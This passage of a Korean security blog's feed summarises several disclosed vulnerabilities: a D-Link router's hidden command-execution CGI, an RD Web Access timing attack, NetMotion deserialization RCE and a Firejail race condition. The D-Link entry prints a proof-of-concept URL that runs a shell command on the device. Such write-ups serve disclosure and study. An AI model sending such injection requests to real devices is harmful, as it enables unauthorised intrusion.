    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>open redirect</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-24581: D-Link 라우터의 의도적인 RCE 취약점</title>
    <link href="/2021/02/12/l0ch/2021-02-12/"/>
    <url>/2021/02/12/l0ch/2021-02-12/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://reconshell.com/cve-2020-24581-d-link-dsl-2888a-remote-command-execution/">CVE-2020-24581 D-Link DSL-2888A Remote Command Execution</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>D-Link DSL-2888A AU_2.31_V1.1.47ae55 &#xC774;&#xC804; &#xBC84;&#xC804;</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xB300;&#xB9CC; D-link&#xC0AC;&#xC758; &#xD1B5;&#xD569; &#xC11C;&#xBE44;&#xC2A4; &#xB77C;&#xC6B0;&#xD130; &#xC81C;&#xD488;&#xC778; DSL-2888A &#xD38C;&#xC6E8;&#xC5B4;&#xC5D0;&#xC11C; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBCF4;&#xC548; &#xC5F0;&#xAD6C;&#xC6D0;&#xB4E4;&#xC740; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xAE30;&#xB2A5;&#xC774; &#xC6F9; &#xC778;&#xD130;&#xD398;&#xC774;&#xC2A4;&#xC5D0;&#xC11C; &#xC815;&#xC0C1;&#xC801;&#xC778; &#xC0AC;&#xC6A9;&#xC73C;&#xB85C;&#xB294; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC5C6;&#xC5B4; &#xC758;&#xB3C4;&#xC801;&#xC73C;&#xB85C; &#xC228;&#xACA8;&#xC9C4; &#xAE30;&#xB2A5;&#xC774;&#xB77C;&#xACE0; &#xBD84;&#xC11D;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xB2F9; &#xC81C;&#xD488;&#xC774; &#xC6F9; &#xC11C;&#xBE44;&#xC2A4;&#xB97C; &#xCD08;&#xAE30;&#xD654;&#xD560; &#xB54C; <code>cgi-bin</code>&#xCEF4;&#xD3EC;&#xB10C;&#xD2B8;&#xAC00; &#xB85C;&#xB4DC;&#xB429;&#xB2C8;&#xB2E4;. &#xCDE8;&#xC57D;&#xC810;&#xC740; <code>cgi-bin</code> &#xB514;&#xB809;&#xD130;&#xB9AC;&#xC758; <code>execute_cmd.cgi</code> &#xD30C;&#xC77C;&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xBA70; &#xC778;&#xC99D;&#xB41C; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; <code>execute_cmd.cgi</code>&#xC5D0; &#xC811;&#xADFC; &#xC2DC; <code>ajax.js</code>&#xC5D0;&#xC11C; &#xC694;&#xCCAD; &#xCFFC;&#xB9AC;&#xC758; &#xB450; &#xBC88;&#xC9F8; &#xB9E4;&#xAC1C;&#xBCC0;&#xC218;&#xB97C; &#xAC00;&#xC838;&#xC640; &#xC2E4;&#xD589;&#xD558;&#xB294;&#xB370;, &#xC774;&#xB54C; &#xB9E4;&#xAC1C; &#xBCC0;&#xC218;&#xC5D0; &#xB300;&#xD55C; &#xAC80;&#xC99D;&#xC774; &#xC5C6;&#xC5B4; &#xC784;&#xC758; &#xBA85;&#xB839; &#xC2E4;&#xD589;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx">get : <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">_dataType</span>)</span><span class="hljs-function"></span>{<span class="hljs-keyword">var</span> _url = <span class="hljs-built_in">this</span>.url;<span class="hljs-keyword">if</span>(_url.indexOf(<span class="hljs-string">&apos;?&apos;</span>) == <span class="hljs-number">-1</span>)_url += <span class="hljs-string">&apos;?timestamp=&apos;</span> + <span class="hljs-keyword">new</span> <span class="hljs-built_in">Date</span>().getTime();<span class="hljs-keyword">else</span>_url += <span class="hljs-string">&quot;&amp;timestamp=&quot;</span> + <span class="hljs-keyword">new</span> <span class="hljs-built_in">Date</span>().getTime();<span class="hljs-keyword">if</span>(<span class="hljs-built_in">this</span>.queryString.length &gt; <span class="hljs-number">0</span>)_url += <span class="hljs-string">&quot;&amp;&quot;</span> + <span class="hljs-built_in">this</span>.queryString;<span class="hljs-built_in">this</span>.xmlHttp.open(<span class="hljs-string">&quot;GET&quot;</span>, _url, <span class="hljs-literal">true</span>);...</code></pre><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xC778;&#xC99D; &#xC6B0;&#xD68C; &#xCDE8;&#xC57D;&#xC810;&#xC778; CVE-2020-24579&#xC640; &#xAC19;&#xC774; &#xC545;&#xC6A9;&#xB418;&#xC5B4; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xC778;&#xC99D;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC784;&#xC758; &#xBA85;&#xB839;&#xC744; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li>&#xC544;&#xBB34; &#xAD00;&#xB9AC;&#xC790; &#xD328;&#xC2A4;&#xC6CC;&#xB4DC;&#xB85C; &#xB85C;&#xADF8;&#xC778; &#xC778;&#xC99D;&#xC744; &#xC218;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</li><li>&#xB0B4;&#xBD80;&#xC801;&#xC73C;&#xB85C;&#xB294; &#xC720;&#xD6A8;&#xD55C; &#xC778;&#xC99D; &#xC138;&#xC158;&#xC774; &#xC774;&#xB8E8;&#xC5B4;&#xC838; &#xC778;&#xC99D; &#xD398;&#xC774;&#xC9C0;&#xC5D0; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. (CVE-2020-24579)</li><li>&#xC774;&#xD6C4; ls &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xB294; poc&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ol><pre><code class="hljs http">http://[DeviceIP]/cgi-bin/execute_cmd.cgi?timestamp=1589333279490&amp;cmd=ls</code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>d-link</tag>
      
      <tag>rce</tag>
      
      <tag>router</tag>
      
      <tag>L0ch</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Microsoft RD Web Access Authentication Timing Attack</title>
    <link href="/2021/02/11/idioth/2021-02-11/"/>
    <url>/2021/02/11/idioth/2021-02-11/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://raxis.com/blog/rd-web-access-vulnerability">Microsoft Remote Desktop Web Access Authentication Timing Attack</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows Server 2016</li><li>Windows Server 2019</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Microsoft&#xC758; Remote Desktop Web Access &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;(RD Web Access)&#xC5D0;&#xC11C; Active Directory &#xB3C4;&#xBA54;&#xC778; &#xB0B4;&#xC758; &#xC0AC;&#xC6A9;&#xC790; &#xC774;&#xB984;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xB294; anonymous authentication timing attack &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. RD Web Access&#xB294; &#xC6F9; &#xBE0C;&#xB77C;&#xC6B0;&#xC800;&#xB97C; &#xD1B5;&#xD574; &#xC6D0;&#xACA9; &#xB370;&#xC2A4;&#xD06C;&#xD1B1; &#xC11C;&#xBE44;&#xC2A4;&#xC5D0; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xB294; &#xC6F9; &#xAE30;&#xBC18; &#xC6D0;&#xACA9; &#xB370;&#xC2A4;&#xD06C;&#xD1B1; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xACFC; &#xBE44;&#xC2B7;&#xD55C; &#xD0C0;&#xC774;&#xBC0D; &#xAE30;&#xBC18; &#xC778;&#xC99D; &#xCDE8;&#xC57D;&#xC810;&#xC774; Outlook Web &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC5D0;&#xB3C4; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. &#xC720;&#xD6A8;&#xD55C; &#xC0AC;&#xC6A9;&#xC790;&#xC640; &#xC720;&#xD6A8;&#xD558;&#xC9C0; &#xC54A;&#xC740; &#xC0AC;&#xC6A9;&#xC790;&#xC758; &#xC778;&#xC99D; &#xC2DC;&#xB3C4;&#xC758; &#xC751;&#xB2F5; &#xC2DC;&#xAC04;&#xC744; &#xBE44;&#xAD50;&#xD558;&#xC5EC; &#xC720;&#xD6A8;&#xD55C; &#xC0AC;&#xC6A9;&#xC790;&#xC778;&#xC9C0; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. RD Web Access&#xC5D0;&#xC11C; &#xC720;&#xD6A8;&#xD55C; &#xC0AC;&#xC6A9;&#xC790;&#xC758; &#xC751;&#xB2F5; &#xC2DC;&#xAC04;&#xC740; &#xBE44;&#xBC00;&#xBC88;&#xD638;&#xAC00; &#xD2C0;&#xB824;&#xB3C4; 232 &#xBC00;&#xB9AC;&#xC138;&#xCEE8;&#xB4DC;&#xC758; &#xC2DC;&#xAC04;&#xC774; &#xAC78;&#xB9AC;&#xC9C0;&#xB9CC;, &#xC720;&#xD6A8;&#xD558;&#xC9C0; &#xC54A;&#xC740; &#xC0AC;&#xC6A9;&#xC790;&#xC758; &#xACBD;&#xC6B0; &#xC751;&#xB2F5; &#xC2DC;&#xAC04;&#xC774; 4&#xCD08;&#xAC00; &#xB118;&#xC5B4;&#xAC11;&#xB2C8;&#xB2E4;. &#xB300;&#xC0C1; &#xC11C;&#xBC84;&#xAC00; &#xC778;&#xC99D; &#xC2DC;&#xB3C4; &#xC694;&#xCCAD;&#xC5D0; &#xC751;&#xB2F5;&#xD558;&#xB294; &#xC2DC;&#xAC04;&#xC744; &#xD1B5;&#xD574; &#xC0AC;&#xC6A9;&#xC790; &#xC774;&#xB984;&#xC758; &#xC720;&#xD6A8;&#xC131;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC545;&#xC6A9;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C;&#xB294; &#xB300;&#xC0C1; &#xC11C;&#xBC84;&#xC758; Active Directory &#xB3C4;&#xBA54;&#xC778;&#xC744; &#xC54C;&#xC544;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. RPC&#xC5D0; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xB294; &#xACBD;&#xC6B0; &#xC870;&#xC791;&#xB41C; NTLM Challenge &#xC694;&#xCCAD;&#xC744; &#xD1B5;&#xD574; &#xD0C0;&#xAE43;&#xC758; Active Directory &#xB3C4;&#xBA54;&#xC778;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. Active Directory &#xB3C4;&#xBA54;&#xC778;&#xC744; &#xC5BB;&#xC73C;&#xBA74;, &#xB3C4;&#xBA54;&#xC778;&#xC73C;&#xB85C;&#xBD80;&#xD130; &#xC720;&#xD6A8;&#xD55C; &#xC0AC;&#xC6A9;&#xC790;&#xC758; &#xC774;&#xB984;&#xC744; &#xC5BB;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD574;&#xCEE4;&#xB294; &#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC545;&#xC6A9;&#xD558;&#xC5EC; Active Directory &#xD658;&#xACBD;&#xC5D0; &#xB300;&#xD55C; &#xC815;&#xBCF4;&#xB97C; &#xC218;&#xC9D1;&#xD558;&#xACE0; 2&#xCC28; &#xACF5;&#xACA9;&#xC5D0; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xB294; &#xC720;&#xD6A8;&#xD55C; &#xC0AC;&#xC6A9;&#xC790; &#xC774;&#xB984; &#xB9AC;&#xC2A4;&#xD2B8;&#xB97C; &#xC5BB;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC758; metasploit &#xBAA8;&#xB4C8; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xC815;&#xBCF4;&#xB294; <a href="https://github.com/rapid7/metasploit-framework/pull/14544">&#xC5EC;&#xAE30;</a>&#xC5D0;&#xC11C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>microsoft</tag>
      
      <tag>idioth</tag>
      
      <tag>rd web</tag>
      
      <tag>timming attack</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-26912: NetMotion Mobility Deserialization to RCE</title>
    <link href="/2021/02/10/fabu1ous/2021-02-10/"/>
    <url>/2021/02/10/fabu1ous/2021-02-10/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://ssd-disclosure.com/ssd-advisory-netmotion-mobility-server-multiple-deserialization-of-untrusted-data-lead-to-rce/">NetMotion Mobility Server Multiple Deserializaion of Untrusted Data Lead to RCE</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>NetMotion Mobility Server 11.73 &#xC774;&#xC804; &#xBC84;&#xC804;</p><p>NetMotion Mobility Server 12.01.09045</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>NetMotion Mobility&#xB294; &#xC0AC;&#xB0B4; &#xB124;&#xD2B8;&#xC6CC;&#xD06C;&#xB97C; &#xC548;&#xC804;&#xD558;&#xAC8C; &#xC678;&#xBD80; &#xBAA8;&#xBC14;&#xC77C; &#xAE30;&#xAE30;&#xB85C; &#xC5F0;&#xC7A5;&#xC2DC;&#xD0A4;&#xAE30; &#xC704;&#xD574; &#xC0AC;&#xC6A9;&#xD558;&#xB294; VPN&#xC785;&#xB2C8;&#xB2E4;. NetMotion Mobility Server 12.01.09045&#xB294; untrusted data&#xC5D0; &#xB300;&#xD55C; Java deserialization&#xCDE8;&#xC57D;&#xC810; &#xD328;&#xD134;&#xC774; &#xC5EC;&#xB7EC; &#xAC1C; &#xC874;&#xC7AC;&#xD574; SYSTEM &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xC6D0;&#xACA9;&#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;(CVE-2021-26912).</p><ol><li><p>SupportRpcServlet</p><pre><code class="hljs java">...RpcData rpcData = (RpcData)objectInputStream.readObject();      <span class="hljs-keyword">if</span> (rpcData.validate(<span class="hljs-keyword">true</span>)) {        command(paramHttpServletResponse, rpcData);      }...</code></pre><p><code>com.nmwco.server.support.SupportRpcServlet</code> &#xD074;&#xB798;&#xC2A4;&#xC758; &#xCF54;&#xB4DC;&#xC785;&#xB2C8;&#xB2E4;. Inputstream&#xC73C;&#xB85C;&#xBD80;&#xD130; &#xD2B9;&#xBCC4;&#xD55C; &#xAC80;&#xC0AC; &#xBC0F; &#xBCF4;&#xD638; &#xC5C6;&#xC774; <code>readObject()</code>&#xB97C; &#xD1B5;&#xD574; <code>rpcData</code>&#xC758; &#xAC12;&#xC744; &#xC124;&#xC815;&#xD569;&#xB2C8;&#xB2E4;. Inputstream&#xC740; &#xD574;&#xCEE4;&#xAC00; &#xC81C;&#xC5B4;(attacker-controlled)&#xD560; &#xC218; &#xC788;&#xC73C;&#xBBC0;&#xB85C; RCE&#xAC00; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p></li><li><p>RpcServlet</p><pre><code class="hljs aspectj">...  <span class="hljs-keyword">public</span> <span class="hljs-function">RpcData <span class="hljs-title">readObject</span><span class="hljs-params">(ObjectInputStream param1ObjectInputStream)</span> <span class="hljs-keyword">throws</span> Exception </span>{            <span class="hljs-keyword">return</span> (RpcData)param1ObjectInputStream.readObject();          }...</code></pre><p><code>com.nmwco.server.events.EventRpcServlet</code> &#xD074;&#xB798;&#xC2A4;&#xC758; &#xCF54;&#xB4DC;&#xC785;&#xB2C8;&#xB2E4;. readObject dispatcher&#xB294; RpcData &#xD0C0;&#xC785;&#xC758; &#xC785;&#xB825;&#xC744; &#xBC1B;&#xC744; &#xB54C; attacker-controlled &#xB370;&#xC774;&#xD130;&#xC5D0; &#xB300;&#xD55C; &#xAC80;&#xC0AC;&#xB97C; &#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;.</p></li><li><p>MvcUtil valueStringToObject</p><pre><code class="hljs java">...mvcController.invoke(servletContext, paramHttpServletRequest, paramHttpServletResponse);...</code></pre><p><code>com.nmwco.server.mvc.MvcServlet</code> &#xD074;&#xB798;&#xC2A4;&#xC758; &#xCF54;&#xB4DC;&#xC785;&#xB2C8;&#xB2E4;. attacker-contolled &#xB370;&#xC774;&#xD130;&#xC778; <code>paramHttpServletRequest</code>&#xB97C; 2&#xBC88;&#xC9F8; &#xC778;&#xC790;&#xB85C; <code>invoke</code> &#xBA54;&#xC11C;&#xB4DC;&#xAC00; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;.</p></li><li><p>webrepdb StatusServlet</p><pre><code class="hljs lasso"><span class="hljs-params">...</span>param1ObjectInputStream) throws Exception {   <span class="hljs-comment">// 1</span>            <span class="hljs-keyword">return</span> (RpcData)param1ObjectInputStream.readObject();          }<span class="hljs-params">...</span></code></pre><p><code>com.nmwco.server.web.repdb.StatusServlet</code> &#xD074;&#xB798;&#xC2A4;&#xC758; &#xCF54;&#xB4DC;&#xC785;&#xB2C8;&#xB2E4;. attacker-controlled &#xB370;&#xC774;&#xD130;&#xC5D0; &#xB300;&#xD55C; <code>readObject()</code>&#xD638;&#xCD9C;&#xC744; &#xC0AC;&#xC6A9;&#xD574; GET &#xB610;&#xB294; POST request&#xC5D0; &#xB300;&#xD55C; &#xB514;&#xC2A4;&#xD328;&#xCC98;&#xB97C; &#xC124;&#xC815;&#xD569;&#xB2C8;&#xB2E4;.</p></li></ol>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>rce</tag>
      
      <tag>deserialization</tag>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Privilege escalation in firejail overlayfs</title>
    <link href="/2021/02/09/l0ch/2021-02-09/"/>
    <url>/2021/02/09/l0ch/2021-02-09/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://seclists.org/oss-sec/2021/q1/121">Firejail: root privilege escalation in OverlayFS code</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Firejail 0.9.30</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Firejail&#xC740; Linux &#xD658;&#xACBD;&#xC5D0;&#xC11C; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC758; &#xC2E4;&#xD589; &#xD658;&#xACBD;&#xC744; &#xC81C;&#xD55C;&#xD558;&#xB294; SUID &#xC0CC;&#xB4DC;&#xBC15;&#xC2F1; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC785;&#xB2C8;&#xB2E4;. Linux&#xC6A9; &#xD1B5;&#xD569; &#xB9C8;&#xC6B4;&#xD2B8; &#xD30C;&#xC77C; &#xC2DC;&#xC2A4;&#xD15C;&#xC778; <a href="https://en.wikipedia.org/wiki/OverlayFS">overlayfs</a> &#xAE30;&#xB2A5;&#xC774; &#xD65C;&#xC131;&#xD654;&#xB41C; Firejail&#xC5D0;&#xC11C; race condition&#xC744; &#xD1B5;&#xD574; root &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xC784;&#xC758; &#xD30C;&#xC77C;&#xC744; &#xC218;&#xC815;&#xD560; &#xC218; &#xC788;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC544;&#xB798;&#xB294;  <code>fs_overlayfs()</code> &#xD568;&#xC218;&#xC758; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xC18C;&#xC2A4;&#xCF54;&#xB4DC;&#xC785;&#xB2C8;&#xB2E4;</p><pre><code class="hljs c">    <span class="hljs-number">943</span> <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">fs_overlayfs</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>{...    <span class="hljs-number">969</span>         <span class="hljs-comment">// we disable overlayfs for now, pending fixing</span>    <span class="hljs-number">970</span>         <span class="hljs-keyword">if</span> (major &gt;= <span class="hljs-number">4</span> &amp;&amp;minor &gt;= <span class="hljs-number">19</span>) {    <span class="hljs-number">971</span>                 <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Error: OverlayFS disabled for Linux kernels 4.19 and newer, pending fixing.\\n&quot;</span>);    <span class="hljs-number">972</span>                 <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);    <span class="hljs-number">973</span>         }...   <span class="hljs-number">1033</span>         <span class="hljs-keyword">if</span> (mkdirat(basefd, <span class="hljs-string">&quot;odiff&quot;</span>, <span class="hljs-number">0755</span>) == <span class="hljs-number">-1</span> &amp;&amp; errno != EEXIST) {   <span class="hljs-number">1034</span>                 perror(<span class="hljs-string">&quot;mkdir&quot;</span>);   <span class="hljs-number">1035</span>                 <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Error: cannot create overlay directory         %s\\n&quot;</span>, odiff);   <span class="hljs-number">1036</span>                 <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);   <span class="hljs-number">1037</span>         }   <span class="hljs-number">1038</span>         ASSERT_PERMS(odiff, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0755</span>);...   <span class="hljs-number">1065</span>         <span class="hljs-keyword">else</span> { <span class="hljs-comment">// kernel 3.18 or newer</span>   <span class="hljs-number">1066</span>                 <span class="hljs-keyword">if</span> (asprintf(&amp;option, <span class="hljs-string">&quot;lowerdir=/,upperdir=%s,workdir=%s        &quot;</span>, odiff, owork) == <span class="hljs-number">-1</span>)   <span class="hljs-number">1067</span>                         errExit(<span class="hljs-string">&quot;asprintf&quot;</span>);   <span class="hljs-number">1068</span>                 <span class="hljs-keyword">if</span> (mount(<span class="hljs-string">&quot;overlay&quot;</span>, oroot, <span class="hljs-string">&quot;overlay&quot;</span>, MS_MGC_VAL, optio        n) &lt; <span class="hljs-number">0</span>) {</code></pre><p>Firejail&#xC740; overlayfs&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC0AC;&#xC6A9;&#xC790; &#xD648; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xC5D0;&#xC11C; &#xC2DC;&#xC791;&#xD558;&#xB294; &#xB9C8;&#xC6B4;&#xD2B8; &#xB300;&#xC0C1; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xB97C; &#xCC3E;&#xC544; &#xC774;&#xB3D9;&#xD558;&#xBA70; root &#xC18C;&#xC720;&#xC774;&#xACE0;, &#xB2E4;&#xB978; &#xC0AC;&#xC6A9;&#xC790;/&#xADF8;&#xB8F9; &#xAD8C;&#xD55C;&#xC774; &#xC5C6;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD55C; &#xB4A4; &#xB9C8;&#xC6B4;&#xD2B8; &#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C; &#xB514;&#xB809;&#xD130;&#xB9AC; &#xCC38;&#xC870;&#xC5D0; &#xD30C;&#xC77C; &#xB514;&#xC2A4;&#xD06C;&#xB9BD;&#xD130;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC9C0; &#xC54A;&#xACE0; &#xC808;&#xB300; &#xACBD;&#xB85C;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294;&#xB370;, &#xAD8C;&#xD55C; &#xCCB4;&#xD06C;&#xC640; &#xB9C8;&#xC6B4;&#xD2B8; &#xC0AC;&#xC774; &#xC2DC;&#xAC04; &#xB3D9;&#xC548; &#xB9C8;&#xC6B4;&#xD2B8; &#xB300;&#xC0C1; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xB97C; &#xD574;&#xCEE4;&#xAC00; &#xC870;&#xC791;&#xD55C; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xB85C; &#xAD50;&#xCCB4;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB97C; &#xC545;&#xC6A9;&#xD558;&#xBA74; &#xAD50;&#xCCB4;&#xB41C; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xC758; &#xC2EC;&#xBCFC;&#xB9AD; &#xB9C1;&#xD06C;&#xB97C; &#xD1B5;&#xD574; root &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xC678;&#xBD80; &#xC2DC;&#xC2A4;&#xD15C; &#xD30C;&#xC77C;&#xC744; &#xC784;&#xC758;&#xB85C; &#xC218;&#xC815;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>Firejail &#xAC1C;&#xBC1C;&#xC0AC;&#xB294; overlayfs &#xAE30;&#xB2A5;&#xC744; &#xC77C;&#xC2DC;&#xC801;&#xC73C;&#xB85C; &#xBE44;&#xD65C;&#xC131;&#xD654; &#xD55C; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xB97C; &#xB9B4;&#xB9AC;&#xC2A4;&#xD588;&#xC73C;&#xBA70;, &#xD574;&#xB2F9; &#xD328;&#xCE58;&#xB294; <a href="https://github.com/netblue30/firejail/commit/97d8a03cad19501f017587cc4e47d8418273834b&#xC5D0;&#xC11C;">https://github.com/netblue30/firejail/commit/97d8a03cad19501f017587cc4e47d8418273834b&#xC5D0;&#xC11C;</a> &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>eop</tag>
      
      <tag>toctou</tag>
      
      <tag>L0ch</tag>
      
      <tag>arbitrary file modification</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] 안드로이드 장치를 타겟으로 한 Matryosh Botnet</title>
    <link href="/2021/02/08/idioth/2021-02-08/"/>
    <url>/2021/02/08/idioth/2021-02-08/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.netlab.360.com/matryosh-botnet-is-spreading-en/">New Threat: Matryosh Botnet Is Spreading</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>ADB(Android Debug Bridge) &#xAE30;&#xB2A5;&#xC774; &#xD65C;&#xC131;&#xD654; &#xB418;&#xC5B4;&#xC788;&#xB294; &#xC548;&#xB4DC;&#xB85C;&#xC774;&#xB4DC; &#xC7A5;&#xCE58;</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>360 netlab&#xC5D0;&#xC11C; ADB(Android Debug Bridge)&#xB97C; &#xD1B5;&#xD574; &#xC804;&#xD30C;&#xB418;&#xACE0; &#xC788;&#xB294; DDoS&#xB97C; &#xBAA9;&#xC801;&#xC73C;&#xB85C; &#xD55C; &#xBD07;&#xB137; &#x2018;Matryosh&#x2019;&#xC744; &#xBC1C;&#xACAC;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. <a href="https://developer.android.com/studio/command-line/adb?hl=ko">ADB</a>&#xB294; &#xAC1C;&#xBC1C;&#xC790;&#xAC00; &#xC548;&#xB4DC;&#xB85C;&#xC774;&#xB4DC; 